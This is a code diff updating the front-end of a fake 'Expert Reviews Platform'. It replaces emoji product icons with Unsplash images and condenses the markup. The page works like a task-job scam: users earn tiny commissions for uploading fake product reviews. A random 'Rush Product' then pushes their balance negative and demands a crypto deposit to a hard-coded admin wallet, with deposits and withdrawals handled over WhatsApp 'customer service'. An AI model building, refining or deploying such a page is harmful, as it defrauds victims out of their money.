@@ -6,6 +6,7 @@
     <title>Expert Reviews Platform v3.0</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
     <style>
+        /* ===== SAME STYLES AS BEFORE ===== */
         * {
             margin: 0;
             padding: 0;
@@ -399,7 +400,7 @@
             background: #2a5f4a;
         }
 
-        /* PRODUCT CARD - Professional */
+        /* PRODUCT CARD WITH REAL IMAGES */
         .product-card {
             background: linear-gradient(145deg, #1a2337, #141b2b);
             border-radius: 16px;
@@ -418,6 +419,7 @@
             font-weight: 700;
             text-transform: uppercase;
             letter-spacing: 0.5px;
+            z-index: 5;
         }
         .product-card .product-badge.normal {
             background: #1f2a44;
@@ -435,12 +437,26 @@
 
         .product-card .product-image {
             text-align: center;
-            font-size: 48px;
             padding: 10px 0;
-            background: #0b0e1a;
             border-radius: 12px;
             margin-bottom: 14px;
+            background: #0b0e1a;
             border: 1px solid #1e2740;
+            height: 140px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .product-card .product-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 12px;
+        }
+        .product-card .product-image .no-image {
+            font-size: 48px;
+            color: #8892b0;
         }
 
         .product-card .product-name {
@@ -725,7 +741,6 @@
             margin-top: 16px;
         }
 
-        /* DEPOSIT MODAL - Contact CS */
         .deposit-modal .modal-icon {
             text-align: center;
             font-size: 48px;
@@ -810,43 +825,28 @@
         <i class="fab fa-whatsapp"></i>
     </a>
 
-    <!-- DEPOSIT MODAL - Contact Customer Service -->
+    <!-- DEPOSIT MODAL -->
     <div class="modal-overlay" id="depositModal">
         <div class="modal-box deposit-modal">
             <button class="close-modal" onclick="closeDepositModal()">✕</button>
             <div class="modal-icon">💰</div>
             <div class="modal-title">Make a Deposit</div>
             <div class="modal-sub">Contact our customer service to complete your deposit</div>
-
             <div class="wallet-box">
                 <div class="wallet-label">📤 Send funds to this wallet address:</div>
                 <div class="wallet-address" id="modalWalletAddress">0x742d35Cc6634C0532925a3b844Bc454e4438f44e</div>
                 <button class="copy-btn-sm" onclick="copyModalWallet()"><i class="fas fa-copy"></i> Copy Address</button>
             </div>
-
             <div style="background:#1a2337;padding:12px;border-radius:10px;border:1px solid #2a3450;margin-bottom:16px;">
-                <div class="flex small-text">
-                    <span>💵 Minimum Deposit:</span>
-                    <span style="color:#64ff9e;">$50</span>
-                </div>
-                <div class="flex small-text mt-8">
-                    <span>⏱ Processing Time:</span>
-                    <span style="color:#88b0ff;">5-15 minutes</span>
-                </div>
-                <div class="flex small-text mt-8">
-                    <span>🏦 Network:</span>
-                    <span style="color:#f0b34b;">BEP20 / ERC20</span>
-                </div>
+                <div class="flex small-text"><span>💵 Minimum Deposit:</span><span style="color:#64ff9e;">$50</span></div>
+                <div class="flex small-text mt-8"><span>⏱ Processing Time:</span><span style="color:#88b0ff;">5-15 minutes</span></div>
+                <div class="flex small-text mt-8"><span>🏦 Network:</span><span style="color:#f0b34b;">BEP20 / ERC20</span></div>
             </div>
-
             <a href="https://wa.me/1234567890?text=Hello%20Expert%20Reviews%2C%20I%20want%20to%20make%20a%20deposit.%20My%20username%20is%20[USERNAME].%20Please%20help%20me%20with%20the%20deposit%20process." 
                class="cs-contact" target="_blank">
                 <i class="fab fa-whatsapp"></i> Contact Customer Service
             </a>
-
-            <div class="deposit-note">
-                ⚡ Our team will assist you with the deposit within 5 minutes
-            </div>
+            <div class="deposit-note">⚡ Our team will assist you with the deposit within 5 minutes</div>
         </div>
     </div>
 
@@ -858,35 +858,16 @@
             <div class="modal-title">Insufficient Balance</div>
             <div class="modal-sub">Your account balance is insufficient to continue. Please deposit to proceed.</div>
             <div class="balance-display">
-                <div class="bal-row">
-                    <span class="bal-label">💰 Current Balance</span>
-                    <span class="bal-value negative" id="insufficientBalance">-$1,265.62</span>
-                </div>
-                <div class="bal-row">
-                    <span class="bal-label">⚡ Rush Product Value</span>
-                    <span class="bal-value gold" id="insufficientRushValue">$2,579.35</span>
-                </div>
-                <div class="bal-row">
-                    <span class="bal-label">💵 Amount Required</span>
-                    <span class="bal-value gold" id="insufficientRequired">$1,265.62</span>
-                </div>
-                <div class="bal-row">
-                    <span class="bal-label">🏆 Potential 6x Commission</span>
-                    <span class="bal-value green" id="insufficientCommission">$77.38</span>
-                </div>
+                <div class="bal-row"><span class="bal-label">💰 Current Balance</span><span class="bal-value negative" id="insufficientBalance">-$1,265.62</span></div>
+                <div class="bal-row"><span class="bal-label">⚡ Rush Product Value</span><span class="bal-value gold" id="insufficientRushValue">$2,579.35</span></div>
+                <div class="bal-row"><span class="bal-label">💵 Amount Required</span><span class="bal-value gold" id="insufficientRequired">$1,265.62</span></div>
+                <div class="bal-row"><span class="bal-label">🏆 Potential 6x Commission</span><span class="bal-value green" id="insufficientCommission">$77.38</span></div>
             </div>
             <div class="modal-actions">
-                <a href="https://wa.me/1234567890?text=Hello%20Expert%20Reviews%2C%20I%20have%20insufficient%20balance%20and%20need%20help%20with%20deposit" 
-                   class="btn-cs" target="_blank">
-                    <i class="fab fa-whatsapp"></i> Contact CS
-                </a>
-                <button class="btn-deposit-modal" onclick="confirmInsufficientDeposit()">
-                    <i class="fas fa-check-circle"></i> I Have Deposited
-                </button>
+                <a href="https://wa.me/1234567890?text=Hello%20Expert%20Reviews%2C%20I%20have%20insufficient%20balance%20and%20need%20help%20with%20deposit" class="btn-cs" target="_blank"><i class="fab fa-whatsapp"></i> Contact CS</a>
+                <button class="btn-deposit-modal" onclick="confirmInsufficientDeposit()"><i class="fas fa-check-circle"></i> I Have Deposited</button>
             </div>
-            <div class="small-text" style="text-align:center;margin-top:12px;color:#8892b0;">
-                ⏱ Deposit will be confirmed within 5-15 minutes
-            </div>
+            <div class="small-text" style="text-align:center;margin-top:12px;color:#8892b0;">⏱ Deposit will be confirmed within 5-15 minutes</div>
         </div>
     </div>
 
@@ -898,43 +879,17 @@
             <div class="modal-title">Task Complete!</div>
             <div class="modal-sub">You have successfully completed 35 product uploads. Here's your earnings summary:</div>
             <div class="earnings-display">
-                <div class="earn-row">
-                    <span class="earn-label">📦 Products Uploaded</span>
-                    <span class="earn-value white" id="completeProducts">35</span>
-                </div>
-                <div class="earn-row">
-                    <span class="earn-label">💰 Total Commission Earned</span>
-                    <span class="earn-value green" id="completeCommission">$87.50</span>
-                </div>
-                <div class="earn-row">
-                    <span class="earn-label">📈 Profit Percentage</span>
-                    <span class="earn-value gold" id="completePercentage">7.74%</span>
-                </div>
-                <div class="earn-row">
-                    <span class="earn-label">🏆 Bonus (5% of profit)</span>
-                    <span class="earn-value gold" id="completeBonus">$4.38</span>
-                </div>
-                <div class="earn-row" style="border-bottom:2px solid #2a3450;padding-bottom:12px;">
-                    <span class="earn-label" style="font-weight:700;color:#e0e6f0;">💰 Total Earnings</span>
-                    <span class="earn-value green" style="font-size:18px;" id="completeTotal">$91.88</span>
-                </div>
-                <div class="earn-row" style="padding-top:12px;">
-                    <span class="earn-label">📊 Average Per Upload</span>
-                    <span class="earn-value white" id="completeAverage">$2.63</span>
-                </div>
-                <div class="earn-row">
-                    <span class="earn-label">⏱ Time Spent</span>
-                    <span class="earn-value white" id="completeTime">~45 min</span>
-                </div>
+                <div class="earn-row"><span class="earn-label">📦 Products Uploaded</span><span class="earn-value white" id="completeProducts">35</span></div>
+                <div class="earn-row"><span class="earn-label">💰 Total Commission Earned</span><span class="earn-value green" id="completeCommission">$87.50</span></div>
+                <div class="earn-row"><span class="earn-label">📈 Profit Percentage</span><span class="earn-value gold" id="completePercentage">7.74%</span></div>
+                <div class="earn-row"><span class="earn-label">🏆 Bonus (5% of profit)</span><span class="earn-value gold" id="completeBonus">$4.38</span></div>
+                <div class="earn-row" style="border-bottom:2px solid #2a3450;padding-bottom:12px;"><span class="earn-label" style="font-weight:700;color:#e0e6f0;">💰 Total Earnings</span><span class="earn-value green" style="font-size:18px;" id="completeTotal">$91.88</span></div>
+                <div class="earn-row" style="padding-top:12px;"><span class="earn-label">📊 Average Per Upload</span><span class="earn-value white" id="completeAverage">$2.63</span></div>
+                <div class="earn-row"><span class="earn-label">⏱ Time Spent</span><span class="earn-value white" id="completeTime">~45 min</span></div>
             </div>
             <div class="modal-actions">
-                <button class="btn btn-primary" onclick="closeCompleteModal()">
-                    <i class="fas fa-thumbs-up"></i> Continue Working
-                </button>
-                <a href="https://wa.me/1234567890?text=Hello%20Expert%20Reviews%2C%20I%20completed%2035%20tasks%20and%20want%20to%20withdraw" 
-                   class="btn btn-whatsapp" target="_blank" style="text-decoration:none;display:block;">
-                    <i class="fab fa-whatsapp"></i> Request Withdrawal
-                </a>
+                <button class="btn btn-primary" onclick="closeCompleteModal()"><i class="fas fa-thumbs-up"></i> Continue Working</button>
+                <a href="https://wa.me/1234567890?text=Hello%20Expert%20Reviews%2C%20I%20completed%2035%20tasks%20and%20want%20to%20withdraw" class="btn btn-whatsapp" target="_blank" style="text-decoration:none;display:block;"><i class="fab fa-whatsapp"></i> Request Withdrawal</a>
             </div>
         </div>
     </div>
@@ -949,38 +904,22 @@
                 <label><i class="fas fa-phone"></i> Phone Number</label>
                 <div class="phone-input">
                     <select id="countryCode">
-                        <option value="+1">🇺🇸 +1</option>
-                        <option value="+44">🇬🇧 +44</option>
-                        <option value="+63">🇵🇭 +63</option>
-                        <option value="+91">🇮🇳 +91</option>
-                        <option value="+62">🇮🇩 +62</option>
-                        <option value="+60">🇲🇾 +60</option>
-                        <option value="+65">🇸🇬 +65</option>
-                        <option value="+61">🇦🇺 +61</option>
-                        <option value="+81">🇯🇵 +81</option>
-                        <option value="+82">🇰🇷 +82</option>
-                        <option value="+86">🇨🇳 +86</option>
-                        <option value="+55">🇧🇷 +55</option>
-                        <option value="+52">🇲🇽 +52</option>
-                        <option value="+39">🇮🇹 +39</option>
-                        <option value="+33">🇫🇷 +33</option>
-                        <option value="+49">🇩🇪 +49</option>
-                        <option value="+7">🇷🇺 +7</option>
-                        <option value="+27">🇿🇦 +27</option>
-                        <option value="+234">🇳🇬 +234</option>
-                        <option value="+254">🇰🇪 +254</option>
-                        <option value="+233">🇬🇭 +233</option>
-                        <option value="+20">🇪🇬 +20</option>
-                        <option value="+971">🇦🇪 +971</option>
-                        <option value="+966">🇸🇦 +966</option>
-                        <option value="+92">🇵🇰 +92</option>
-                        <option value="+880">🇧🇩 +880</option>
-                        <option value="+977">🇳🇵 +977</option>
-                        <option value="+94">🇱🇰 +94</option>
-                        <option value="+95">🇲🇲 +95</option>
-                        <option value="+856">🇱🇦 +856</option>
-                        <option value="+855">🇰🇭 +855</option>
-                        <option value="+670">🇹🇱 +670</option>
+                        <option value="+1">🇺🇸 +1</option><option value="+44">🇬🇧 +44</option>
+                        <option value="+63">🇵🇭 +63</option><option value="+91">🇮🇳 +91</option>
+                        <option value="+62">🇮🇩 +62</option><option value="+60">🇲🇾 +60</option>
+                        <option value="+65">🇸🇬 +65</option><option value="+61">🇦🇺 +61</option>
+                        <option value="+81">🇯🇵 +81</option><option value="+82">🇰🇷 +82</option>
+                        <option value="+86">🇨🇳 +86</option><option value="+55">🇧🇷 +55</option>
+                        <option value="+52">🇲🇽 +52</option><option value="+39">🇮🇹 +39</option>
+                        <option value="+33">🇫🇷 +33</option><option value="+49">🇩🇪 +49</option>
+                        <option value="+7">🇷🇺 +7</option><option value="+27">🇿🇦 +27</option>
+                        <option value="+234">🇳🇬 +234</option><option value="+254">🇰🇪 +254</option>
+                        <option value="+233">🇬🇭 +233</option><option value="+20">🇪🇬 +20</option>
+                        <option value="+971">🇦🇪 +971</option><option value="+966">🇸🇦 +966</option>
+                        <option value="+92">🇵🇰 +92</option><option value="+880">🇧🇩 +880</option>
+                        <option value="+977">🇳🇵 +977</option><option value="+94">🇱🇰 +94</option>
+                        <option value="+95">🇲🇲 +95</option><option value="+856">🇱🇦 +856</option>
+                        <option value="+855">🇰🇭 +855</option><option value="+670">🇹🇱 +670</option>
                     </select>
                     <input type="text" id="loginPhone" placeholder="Enter phone number" />
                 </div>
@@ -989,16 +928,9 @@
                 <label><i class="fas fa-lock"></i> Password (PIN)</label>
                 <input type="password" id="loginPassword" placeholder="Enter PIN" value="123123" />
             </div>
-            <button class="btn" onclick="loginWithPhone()">
-                <i class="fas fa-sign-in-alt"></i> Login
-            </button>
-            <a href="https://wa.me/1234567890?text=Hello%20Expert%20Reviews%2C%20I%20want%20to%20register" 
-               class="whatsapp-btn" target="_blank">
-                <i class="fab fa-whatsapp"></i> Need Help? Chat on WhatsApp
-            </a>
-            <div class="footer">
-                New user? <a onclick="showRegister()">Register here</a>
-            </div>
+            <button class="btn" onclick="loginWithPhone()"><i class="fas fa-sign-in-alt"></i> Login</button>
+            <a href="https://wa.me/1234567890?text=Hello%20Expert%20Reviews%2C%20I%20want%20to%20register" class="whatsapp-btn" target="_blank"><i class="fab fa-whatsapp"></i> Need Help? Chat on WhatsApp</a>
+            <div class="footer">New user? <a onclick="showRegister()">Register here</a></div>
         </div>
 
         <!-- REGISTER -->
@@ -1013,38 +945,22 @@
                 <label><i class="fas fa-phone"></i> Phone Number</label>
                 <div class="phone-input">
                     <select id="regCountryCode">
-                        <option value="+1">🇺🇸 +1</option>
-                        <option value="+44">🇬🇧 +44</option>
-                        <option value="+63">🇵🇭 +63</option>
-                        <option value="+91">🇮🇳 +91</option>
-                        <option value="+62">🇮🇩 +62</option>
-                        <option value="+60">🇲🇾 +60</option>
-                        <option value="+65">🇸🇬 +65</option>
-                        <option value="+61">🇦🇺 +61</option>
-                        <option value="+81">🇯🇵 +81</option>
-                        <option value="+82">🇰🇷 +82</option>
-                        <option value="+86">🇨🇳 +86</option>
-                        <option value="+55">🇧🇷 +55</option>
-                        <option value="+52">🇲🇽 +52</option>
-                        <option value="+39">🇮🇹 +39</option>
-                        <option value="+33">🇫🇷 +33</option>
-                        <option value="+49">🇩🇪 +49</option>
-                        <option value="+7">🇷🇺 +7</option>
-                        <option value="+27">🇿🇦 +27</option>
-                        <option value="+234">🇳🇬 +234</option>
-                        <option value="+254">🇰🇪 +254</option>
-                        <option value="+233">🇬🇭 +233</option>
-                        <option value="+20">🇪🇬 +20</option>
-                        <option value="+971">🇦🇪 +971</option>
-                        <option value="+966">🇸🇦 +966</option>
-                        <option value="+92">🇵🇰 +92</option>
-                        <option value="+880">🇧🇩 +880</option>
-                        <option value="+977">🇳🇵 +977</option>
-                        <option value="+94">🇱🇰 +94</option>
-                        <option value="+95">🇲🇲 +95</option>
-                        <option value="+856">🇱🇦 +856</option>
-                        <option value="+855">🇰🇭 +855</option>
-                        <option value="+670">🇹🇱 +670</option>
+                        <option value="+1">🇺🇸 +1</option><option value="+44">🇬🇧 +44</option>
+                        <option value="+63">🇵🇭 +63</option><option value="+91">🇮🇳 +91</option>
+                        <option value="+62">🇮🇩 +62</option><option value="+60">🇲🇾 +60</option>
+                        <option value="+65">🇸🇬 +65</option><option value="+61">🇦🇺 +61</option>
+                        <option value="+81">🇯🇵 +81</option><option value="+82">🇰🇷 +82</option>
+                        <option value="+86">🇨🇳 +86</option><option value="+55">🇧🇷 +55</option>
+                        <option value="+52">🇲🇽 +52</option><option value="+39">🇮🇹 +39</option>
+                        <option value="+33">🇫🇷 +33</option><option value="+49">🇩🇪 +49</option>
+                        <option value="+7">🇷🇺 +7</option><option value="+27">🇿🇦 +27</option>
+                        <option value="+234">🇳🇬 +234</option><option value="+254">🇰🇪 +254</option>
+                        <option value="+233">🇬🇭 +233</option><option value="+20">🇪🇬 +20</option>
+                        <option value="+971">🇦🇪 +971</option><option value="+966">🇸🇦 +966</option>
+                        <option value="+92">🇵🇰 +92</option><option value="+880">🇧🇩 +880</option>
+                        <option value="+977">🇳🇵 +977</option><option value="+94">🇱🇰 +94</option>
+                        <option value="+95">🇲🇲 +95</option><option value="+856">🇱🇦 +856</option>
+                        <option value="+855">🇰🇭 +855</option><option value="+670">🇹🇱 +670</option>
                     </select>
                     <input type="text" id="regPhone" placeholder="Enter phone number" />
                 </div>
@@ -1057,12 +973,8 @@
                 <label><i class="fas fa-qrcode"></i> Referral Code</label>
                 <input type="text" id="regReferral" placeholder="Enter referral code" />
             </div>
-            <button class="btn" onclick="registerWithPhone()">
-                <i class="fas fa-user-plus"></i> Register & Login
-            </button>
-            <div class="footer">
-                Already have an account? <a onclick="showLogin()">Login here</a>
-            </div>
+            <button class="btn" onclick="registerWithPhone()"><i class="fas fa-user-plus"></i> Register & Login</button>
+            <div class="footer">Already have an account? <a onclick="showLogin()">Login here</a></div>
         </div>
 
         <!-- DASHBOARD -->
@@ -1073,15 +985,10 @@
             </div>
             <div class="subtitle" style="text-align:left;padding-bottom:8px;border-bottom:none;margin-bottom:8px;">
                 <span id="accountTypeBadge" class="badge badge-normal">Training Account</span>
-                <button class="btn" style="width:auto;padding:4px 14px;font-size:12px;display:inline;margin-left:8px;" onclick="switchAccount()">
-                    <i class="fas fa-exchange-alt"></i> Switch
-                </button>
+                <button class="btn" style="width:auto;padding:4px 14px;font-size:12px;display:inline;margin-left:8px;" onclick="switchAccount()"><i class="fas fa-exchange-alt"></i> Switch</button>
             </div>
             <div class="card">
-                <div class="flex">
-                    <span class="label"><i class="fas fa-wallet"></i> Balance</span>
-                    <span id="balanceDisplay" class="balance">$1,130.00</span>
-                </div>
+                <div class="flex"><span class="label"><i class="fas fa-wallet"></i> Balance</span><span id="balanceDisplay" class="balance">$1,130.00</span></div>
                 <div class="flex mt-8 small-text">
                     <span>Deposit: <span id="depositDisplay">$1,000</span></span>
                     <span>Bonus: <span id="bonusDisplay">$130</span></span>
@@ -1089,53 +996,32 @@
                 </div>
             </div>
 
-            <!-- PRODUCT CARD -->
+            <!-- PRODUCT CARD WITH REAL IMAGES -->
             <div class="product-card" id="productCard">
                 <span class="product-badge normal" id="productBadge">Normal</span>
-                <div class="product-image" id="productImage">⌨️</div>
+                <div class="product-image" id="productImage">
+                    <img id="productImg" src="https://images.unsplash.com/photo-1601447503332-6c4c8f5c4f5c?w=200&h=140&fit=crop" alt="Product" />
+                </div>
                 <div class="product-name" id="productName">
                     <span class="highlight">Mechanical Keyboard</span> RGB Gaming Keyboard with Blue Switches
                 </div>
                 <div class="product-details">
-                    <div class="detail-item">
-                        <div class="detail-label">Product Value</div>
-                        <div class="detail-value gold" id="detailValue">$418.94</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Commission</div>
-                        <div class="detail-value blue" id="detailCommission">0.5%</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Profits</div>
-                        <div class="detail-value green" id="detailProfit">$2.09</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Rebate</div>
-                        <div class="detail-value gold" id="detailRebate">$421.03</div>
-                    </div>
+                    <div class="detail-item"><div class="detail-label">Product Value</div><div class="detail-value gold" id="detailValue">$418.94</div></div>
+                    <div class="detail-item"><div class="detail-label">Commission</div><div class="detail-value blue" id="detailCommission">0.5%</div></div>
+                    <div class="detail-item"><div class="detail-label">Profits</div><div class="detail-value green" id="detailProfit">$2.09</div></div>
+                    <div class="detail-item"><div class="detail-label">Rebate</div><div class="detail-value gold" id="detailRebate">$421.03</div></div>
                 </div>
                 <div class="product-actions">
-                    <button class="btn-upload" onclick="uploadProduct()">
-                        <i class="fas fa-upload"></i> Upload Data
-                    </button>
-                    <button class="btn-cancel" onclick="boostProduct()">
-                        <i class="fas fa-bolt"></i> Boost
-                    </button>
+                    <button class="btn-upload" onclick="uploadProduct()"><i class="fas fa-upload"></i> Upload Data</button>
+                    <button class="btn-cancel" onclick="boostProduct()"><i class="fas fa-bolt"></i> Boost</button>
                 </div>
-                <div class="small-text mt-8" style="text-align:center;">
-                    Uploaded: <span id="uploadCount">0</span> / 35 (Set 1 of 2)
-                </div>
-                <div class="progress-bar">
-                    <div class="progress-fill" id="progressFill"></div>
-                </div>
+                <div class="small-text mt-8" style="text-align:center;">Uploaded: <span id="uploadCount">0</span> / 35 (Set 1 of 2)</div>
+                <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
             </div>
 
             <!-- WALLET -->
             <div class="card" style="border-color:#2a4a5c;">
-                <div class="flex">
-                    <span class="label"><i class="fas fa-qrcode"></i> Crypto Wallet</span>
-                    <span class="badge badge-warning" id="walletStatus">Not Set</span>
-                </div>
+                <div class="flex"><span class="label"><i class="fas fa-qrcode"></i> Crypto Wallet</span><span class="badge badge-warning" id="walletStatus">Not Set</span></div>
                 <div class="wallet-input">
                     <input type="text" id="walletInput" placeholder="Enter your crypto wallet address" />
                     <button onclick="saveWallet()"><i class="fas fa-save"></i> Save</button>
@@ -1150,43 +1036,23 @@
             </div>
 
             <div class="grid-2">
-                <button class="btn btn-success" onclick="showHistory()">
-                    <i class="fas fa-history"></i> History
-                </button>
-                <button class="btn btn-danger" onclick="simulateCryptoDeposit()">
-                    <i class="fab fa-bitcoin"></i> Test Deposit
-                </button>
+                <button class="btn btn-success" onclick="showHistory()"><i class="fas fa-history"></i> History</button>
+                <button class="btn btn-danger" onclick="simulateCryptoDeposit()"><i class="fab fa-bitcoin"></i> Test Deposit</button>
             </div>
 
-            <a href="https://wa.me/1234567890?text=Hello%20Expert%20Reviews%20CS%2C%20I%20need%20assistance" 
-               class="btn btn-whatsapp" 
-               target="_blank"
-               style="margin-top:8px; display:block; text-decoration:none;">
-                <i class="fab fa-whatsapp"></i> Chat with Customer Service
-            </a>
+            <a href="https://wa.me/1234567890?text=Hello%20Expert%20Reviews%20CS%2C%20I%20need%20assistance" class="btn btn-whatsapp" target="_blank" style="margin-top:8px; display:block; text-decoration:none;"><i class="fab fa-whatsapp"></i> Chat with Customer Service</a>
 
             <div class="card" style="border-color:#2a4a3a;">
-                <div class="flex">
-                    <span class="label"><i class="fas fa-coins"></i> Today's Commission</span>
-                    <span style="color:#64ff9e;font-weight:700;" id="commissionEarned">$0.00</span>
-                </div>
-                <div class="flex small-text mt-8">
-                    <span>Base Salary: <span id="baseSalaryDisplay">$0</span></span>
-                    <span>Next Payout: <span id="nextPayout">After 2 sets</span></span>
-                </div>
+                <div class="flex"><span class="label"><i class="fas fa-coins"></i> Today's Commission</span><span style="color:#64ff9e;font-weight:700;" id="commissionEarned">$0.00</span></div>
+                <div class="flex small-text mt-8"><span>Base Salary: <span id="baseSalaryDisplay">$0</span></span><span>Next Payout: <span id="nextPayout">After 2 sets</span></span></div>
             </div>
 
             <div id="historyPanel" class="hidden card" style="margin-top:12px;">
-                <div class="flex">
-                    <span class="label">📜 History</span>
-                    <button class="btn" style="width:auto;padding:4px 12px;font-size:12px;" onclick="closeHistory()">✕</button>
-                </div>
+                <div class="flex"><span class="label">📜 History</span><button class="btn" style="width:auto;padding:4px 12px;font-size:12px;" onclick="closeHistory()">✕</button></div>
                 <div id="historyList"></div>
             </div>
 
-            <button class="btn" style="background:#1a2337;color:#8892b0;margin-top:8px;" onclick="logout()">
-                <i class="fas fa-sign-out-alt"></i> Logout
-            </button>
+            <button class="btn" style="background:#1a2337;color:#8892b0;margin-top:8px;" onclick="logout()"><i class="fas fa-sign-out-alt"></i> Logout</button>
         </div>
 
     </div>
@@ -1225,11 +1091,11 @@
         // ===== ADMIN WALLET (Update this with your wallet address) =====
         const ADMIN_WALLET = '0x742d35Cc6634C0532925a3b844Bc454e4438f44e';
 
-        // ===== PRODUCTS WITH PHOTOS & DIFFERENT COMMISSIONS =====
+        // ===== PRODUCTS WITH REAL IMAGES (Unsplash) =====
         const techProducts = [
             { 
                 name: 'Mechanical Keyboard', 
-                icon: '⌨️',
+                image: 'https://images.unsplash.com/photo-1601447503332-6c4c8f5c4f5c?w=200&h=140&fit=crop',
                 desc: 'RGB Gaming Keyboard with Blue Switches',
                 values: [180, 220, 250, 310, 400, 150, 275, 330, 190, 210, 418.94],
                 commission: 0.5,
@@ -1237,7 +1103,7 @@
             },
             { 
                 name: 'Wireless Mouse', 
-                icon: '🖱️',
+                image: 'https://images.unsplash.com/photo-1527814050087-3793815479db?w=200&h=140&fit=crop',
                 desc: 'RGB Gaming Mouse with 16000 DPI Sensor',
                 values: [120, 150, 180, 200, 250, 300, 140, 220, 170, 190],
                 commission: 0.7,
@@ -1245,7 +1111,7 @@
             },
             { 
                 name: 'Gaming Headset', 
-                icon: '🎧',
+                image: 'https://images.unsplash.com/photo-1599669454699-248893623440?w=200&h=140&fit=crop',
                 desc: '7.1 Surround Sound Gaming Headset with Mic',
                 values: [200, 250, 300, 350, 400, 220, 280, 320, 380, 450],
                 commission: 0.8,
@@ -1253,7 +1119,7 @@
             },
             { 
                 name: 'RGB RAM', 
-                icon: '💾',
+                image: 'https://images.unsplash.com/photo-1562976540-1502c2145182?w=200&h=140&fit=crop',
                 desc: '32GB DDR5 RGB Gaming RAM 6000MHz',
                 values: [350, 400, 450, 500, 550, 380, 420, 480, 520, 600],
                 commission: 0.6,
@@ -1261,7 +1127,7 @@
             },
             { 
                 name: 'Gaming Monitor', 
-                icon: '🖥️',
+                image: 'https://images.unsplash.com/photo-1527443224154-c4a3942d3acf?w=200&h=140&fit=crop',
                 desc: '27" 4K 144Hz Gaming Monitor with HDR',
                 values: [500, 600, 700, 800, 900, 550, 650, 750, 850, 1000],
                 commission: 0.5,
@@ -1269,7 +1135,7 @@
             },
             { 
                 name: 'Gaming Chair', 
-                icon: '💺',
+                image: 'https://images.unsplash.com/photo-1596162954151-cdcb4c0f70a8?w=200&h=140&fit=crop',
                 desc: 'Ergonomic Gaming Chair with Lumbar Support',
                 values: [300, 350, 400, 450, 500, 320, 380, 420, 480, 550],
                 commission: 0.6,
@@ -1277,15 +1143,15 @@
             },
             { 
                 name: 'External SSD', 
-                icon: '💿',
+                image: 'https://images.unsplash.com/photo-1531497865144-0464ef8fb9a9?w=200&h=140&fit=crop',
                 desc: '1TB Portable External SSD USB 3.2',
                 values: [150, 180, 200, 250, 300, 170, 190, 220, 280, 350],
                 commission: 0.7,
                 type: 'Storage'
             },
             { 
-                name: 'Webcam 4K', 
-                icon: '📷',
+                name: '4K Webcam', 
+                image: 'https://images.unsplash.com/photo-1587826080692-f439cd0b70da?w=200&h=140&fit=crop',
                 desc: '4K Ultra HD Webcam with Built-in Mic',
                 values: [200, 250, 300, 350, 400, 220, 280, 320, 380, 450],
                 commission: 0.5,
@@ -1293,7 +1159,7 @@
             },
             { 
                 name: 'USB Hub', 
-                icon: '🔌',
+                image: 'https://images.unsplash.com/photo-1583394838336-acd977736f90?w=200&h=140&fit=crop',
                 desc: '7-Port USB-C Hub with Power Delivery',
                 values: [80, 100, 120, 150, 180, 90, 110, 130, 160, 200],
                 commission: 0.8,
@@ -1301,7 +1167,7 @@
             },
             { 
                 name: 'CPU Cooler', 
-                icon: '🌀',
+                image: 'https://images.unsplash.com/photo-1587202372775-e229f172b9d7?w=200&h=140&fit=crop',
                 desc: '240mm AIO Liquid CPU Cooler with RGB',
                 values: [250, 300, 350, 400, 450, 280, 320, 380, 420, 500],
                 commission: 0.5,
@@ -1325,7 +1191,6 @@
 
         // ===== GENERATE PRODUCT =====
         function generateProduct() {
-            // 20% chance of Rush
             if (Math.random() < 0.2 && state.uploadedCount > 0) {
                 state.isRushActive = true;
                 const rush = randomItem(rushProducts);
@@ -1334,7 +1199,7 @@
                     commission: 3,
                     isRush: true,
                     name: '⚡ RUSH PRODUCT',
-                    icon: '⚡',
+                    image: 'https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=200&h=140&fit=crop',
                     desc: 'URGENT - HIGH PRIORITY TASK - 6x COMMISSION'
                 };
             } else {
@@ -1346,7 +1211,7 @@
                     commission: product.commission,
                     isRush: false,
                     name: product.name,
-                    icon: product.icon,
+                    image: product.image,
                     desc: product.desc,
                     type: product.type,
                     baseCommission: product.commission
@@ -1366,7 +1231,12 @@
             $('productBadge').textContent = isRush ? 'RUSH 3%' : `${p.commission}%`;
             $('productBadge').className = 'product-badge ' + (isRush ? 'rush' : 'normal');
 
-            $('productImage').textContent = isRush ? '⚡' : (p.icon || '📦');
+            // Update product image
+            const img = document.getElementById('productImg');
+            if (img) {
+                img.src = p.image || 'https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=200&h=140&fit=crop';
+                img.alt = p.name || 'Product';
+            }
 
             const nameDisplay = isRush ? 
                 `<span class="highlight">⚡ RUSH PRODUCT</span> URGENT - HIGH PRIORITY TASK` :
@@ -1700,155 +1570,4 @@
             }
 
             if (!state.walletAddress) {
-                if (!confirm('⚠️ You haven\'t set a wallet address yet. Your earnings will be sent there.\n\nDo you want to continue without a wallet address?')) {
-                    return;
-                }
-            }
-
-            const p = state.currentProduct;
-            const comm = p.value * (p.commission / 100);
-            state.balance += comm;
-            state.profit += comm;
-            state.totalCommission += comm;
-            state.uploadedCount++;
-            state.totalUploads++;
-
-            state.history.push({
-                type: p.isRush ? 'Rush' : (p.type || 'Normal'),
-                value: p.value,
-                commission: comm,
-                balanceAfter: state.balance,
-            });
-
-            if (state.uploadedCount === 35) {
-                alert(`✅ You have completed 35 product uploads!\n\nTotal Earned: $${fmt(state.totalCommission)}\nProfit Percentage: ${fmt((state.totalCommission / 1130) * 100)}%\n\nCheck your full earnings summary!`);
-                openCompleteModal();
-            }
-
-            if (state.uploadedCount >= state.productsPerSet * state.maxSets) {
-                alert('🎉 Completed 2 sets! You can withdraw now.');
-                if (state.accountType === 'training') {
-                    alert(`Training complete! Total earned: $${fmt(state.profit + state.bonus)}`);
-                    if (state.walletAddress) {
-                        alert(`💰 Funds will be sent to:\n${state.walletAddress}`);
-                    }
-                }
-            } else if (state.uploadedCount % state.productsPerSet === 0 && state.uploadedCount > 0) {
-                state.currentSet++;
